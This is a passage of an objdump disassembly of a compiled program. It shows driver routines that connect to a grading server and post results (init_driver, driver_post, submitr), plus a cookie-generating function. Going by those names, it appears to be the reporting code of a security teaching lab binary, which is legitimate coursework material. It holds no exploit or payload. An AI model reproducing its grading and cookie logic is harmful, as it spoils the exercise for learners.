  4029b7:	48 8b 48 18          	mov    0x18(%rax),%rcx
  4029bb:	48 63 50 14          	movslq 0x14(%rax),%rdx
  4029bf:	48 8d 74 24 04       	lea    0x4(%rsp),%rsi
  4029c4:	48 8b 39             	mov    (%rcx),%rdi
  4029c7:	e8 c4 e3 ff ff       	callq  400d90 <bcopy@plt>
  4029cc:	66 c7 44 24 02 47 26 	movw   $0x2647,0x2(%rsp)
  4029d3:	ba 10 00 00 00       	mov    $0x10,%edx
  4029d8:	48 89 e6             	mov    %rsp,%rsi
  4029db:	89 df                	mov    %ebx,%edi
  4029dd:	e8 1e e4 ff ff       	callq  400e00 <connect@plt>
  4029e2:	85 c0                	test   %eax,%eax
  4029e4:	79 50                	jns    402a36 <init_driver+0x1ac>
  4029e6:	48 b8 45 72 72 6f 72 	movabs $0x55203a726f727245,%rax
  4029ed:	3a 20 55 
  4029f0:	48 89 45 00          	mov    %rax,0x0(%rbp)
  4029f4:	48 b8 6e 61 62 6c 65 	movabs $0x6f7420656c62616e,%rax
  4029fb:	20 74 6f 
  4029fe:	48 89 45 08          	mov    %rax,0x8(%rbp)
  402a02:	48 b8 20 63 6f 6e 6e 	movabs $0x7463656e6e6f6320,%rax
  402a09:	65 63 74 
  402a0c:	48 89 45 10          	mov    %rax,0x10(%rbp)
  402a10:	48 b8 20 74 6f 20 73 	movabs $0x76726573206f7420,%rax
  402a17:	65 72 76 
  402a1a:	48 89 45 18          	mov    %rax,0x18(%rbp)
  402a1e:	66 c7 45 20 65 72    	movw   $0x7265,0x20(%rbp)
  402a24:	c6 45 22 00          	movb   $0x0,0x22(%rbp)
  402a28:	89 df                	mov    %ebx,%edi
  402a2a:	e8 81 e2 ff ff       	callq  400cb0 <close@plt>
  402a2f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402a34:	eb 16                	jmp    402a4c <init_driver+0x1c2>
  402a36:	89 df                	mov    %ebx,%edi
  402a38:	e8 73 e2 ff ff       	callq  400cb0 <close@plt>
  402a3d:	66 c7 45 00 4f 4b    	movw   $0x4b4f,0x0(%rbp)
  402a43:	c6 45 02 00          	movb   $0x0,0x2(%rbp)
  402a47:	b8 00 00 00 00       	mov    $0x0,%eax
  402a4c:	48 83 c4 18          	add    $0x18,%rsp
  402a50:	5b                   	pop    %rbx
  402a51:	5d                   	pop    %rbp
  402a52:	c3                   	retq   

0000000000402a53 <driver_post>:
  402a53:	53                   	push   %rbx
  402a54:	48 83 ec 10          	sub    $0x10,%rsp
  402a58:	4c 89 cb             	mov    %r9,%rbx
  402a5b:	45 85 c0             	test   %r8d,%r8d
  402a5e:	74 22                	je     402a82 <driver_post+0x2f>
  402a60:	48 89 ce             	mov    %rcx,%rsi
  402a63:	bf 85 34 40 00       	mov    $0x403485,%edi
  402a68:	b8 00 00 00 00       	mov    $0x0,%eax
  402a6d:	e8 0e e2 ff ff       	callq  400c80 <printf@plt>
  402a72:	66 c7 03 4f 4b       	movw   $0x4b4f,(%rbx)
  402a77:	c6 43 02 00          	movb   $0x0,0x2(%rbx)
  402a7b:	b8 00 00 00 00       	mov    $0x0,%eax
  402a80:	eb 39                	jmp    402abb <driver_post+0x68>
  402a82:	48 85 ff             	test   %rdi,%rdi
  402a85:	74 26                	je     402aad <driver_post+0x5a>
  402a87:	80 3f 00             	cmpb   $0x0,(%rdi)
  402a8a:	74 21                	je     402aad <driver_post+0x5a>
  402a8c:	4c 89 0c 24          	mov    %r9,(%rsp)
  402a90:	49 89 c9             	mov    %rcx,%r9
  402a93:	49 89 d0             	mov    %rdx,%r8
  402a96:	48 89 f9             	mov    %rdi,%rcx
  402a99:	48 89 f2             	mov    %rsi,%rdx
  402a9c:	be 26 47 00 00       	mov    $0x4726,%esi
  402aa1:	bf c8 2e 40 00       	mov    $0x402ec8,%edi
  402aa6:	e8 9c f6 ff ff       	callq  402147 <submitr>
  402aab:	eb 0e                	jmp    402abb <driver_post+0x68>
  402aad:	66 c7 03 4f 4b       	movw   $0x4b4f,(%rbx)
  402ab2:	c6 43 02 00          	movb   $0x0,0x2(%rbx)
  402ab6:	b8 00 00 00 00       	mov    $0x0,%eax
  402abb:	48 83 c4 10          	add    $0x10,%rsp
  402abf:	5b                   	pop    %rbx
  402ac0:	c3                   	retq   

0000000000402ac1 <check>:
  402ac1:	89 f8                	mov    %edi,%eax
  402ac3:	c1 e8 1c             	shr    $0x1c,%eax
  402ac6:	85 c0                	test   %eax,%eax
  402ac8:	74 1d                	je     402ae7 <check+0x26>
  402aca:	b9 00 00 00 00       	mov    $0x0,%ecx
  402acf:	eb 0b                	jmp    402adc <check+0x1b>
  402ad1:	89 f8                	mov    %edi,%eax
  402ad3:	d3 e8                	shr    %cl,%eax
  402ad5:	3c 0a                	cmp    $0xa,%al
  402ad7:	74 14                	je     402aed <check+0x2c>
  402ad9:	83 c1 08             	add    $0x8,%ecx
  402adc:	83 f9 1f             	cmp    $0x1f,%ecx
  402adf:	7e f0                	jle    402ad1 <check+0x10>
  402ae1:	b8 01 00 00 00       	mov    $0x1,%eax
  402ae6:	c3                   	retq   
  402ae7:	b8 00 00 00 00       	mov    $0x0,%eax
  402aec:	c3                   	retq   
  402aed:	b8 00 00 00 00       	mov    $0x0,%eax
  402af2:	c3                   	retq   

0000000000402af3 <gencookie>:
  402af3:	53                   	push   %rbx
  402af4:	83 c7 01             	add    $0x1,%edi
  402af7:	e8 24 e1 ff ff       	callq  400c20 <srandom@plt>
  402afc:	e8 4f e2 ff ff       	callq  400d50 <random@plt>
  402b01:	89 c3                	mov    %eax,%ebx
  402b03:	89 c7                	mov    %eax,%edi
  402b05:	e8 b7 ff ff ff       	callq  402ac1 <check>
  402b0a:	85 c0                	test   %eax,%eax
  402b0c:	74 ee                	je     402afc <gencookie+0x9>
  402b0e:	89 d8                	mov    %ebx,%eax
  402b10:	5b                   	pop    %rbx
  402b11:	c3                   	retq   
  402b12:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  402b19:	00 00 00 
  402b1c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000402b20 <__libc_csu_init>:
  402b20:	41 57                	push   %r15
  402b22:	41 89 ff             	mov    %edi,%r15d
  402b25:	41 56                	push   %r14
  402b27:	49 89 f6             	mov    %rsi,%r14
  402b2a:	41 55                	push   %r13
  402b2c:	49 89 d5             	mov    %rdx,%r13
  402b2f:	41 54                	push   %r12
  402b31:	4c 8d 25 d8 12 20 00 	lea    0x2012d8(%rip),%r12        # 603e10 <__frame_dummy_init_array_entry>
  402b38:	55                   	push   %rbp
  402b39:	48 8d 2d d8 12 20 00 	lea    0x2012d8(%rip),%rbp        # 603e18 <__init_array_end>
  402b40:	53                   	push   %rbx
  402b41:	4c 29 e5             	sub    %r12,%rbp
  402b44:	31 db                	xor    %ebx,%ebx
  402b46:	48 c1 fd 03          	sar    $0x3,%rbp
  402b4a:	48 83 ec 08          	sub    $0x8,%rsp
  402b4e:	e8 75 e0 ff ff       	callq  400bc8 <_init>
  402b53:	48 85 ed             	test   %rbp,%rbp
  402b56:	74 1e                	je     402b76 <__libc_csu_init+0x56>
  402b58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402b5f:	00 
  402b60:	4c 89 ea             	mov    %r13,%rdx
  402b63:	4c 89 f6             	mov    %r14,%rsi
  402b66:	44 89 ff             	mov    %r15d,%edi
  402b69:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  402b6d:	48 83 c3 01          	add    $0x1,%rbx
  402b71:	48 39 eb             	cmp    %rbp,%rbx
  402b74:	75 ea                	jne    402b60 <__libc_csu_init+0x40>
  402b76:	48 83 c4 08          	add    $0x8,%rsp
  402b7a:	5b                   	pop    %rbx
  402b7b:	5d                   	pop    %rbp
  402b7c:	41 5c                	pop    %r12
  402b7e:	41 5d                	pop    %r13
  402b80:	41 5e                	pop    %r14
  402b82:	41 5f                	pop    %r15
  402b84:	c3                   	retq   
  402b85:	90                   	nop
  402b86:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  402b8d:	00 00 00 

0000000000402b90 <__libc_csu_fini>:
  402b90:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000402b94 <_fini>:
  402b94:	48 83 ec 08          	sub    $0x8,%rsp
  402b98:	48 83 c4 08          	add    $0x8,%rsp
  402b9c:	c3                   	retq   
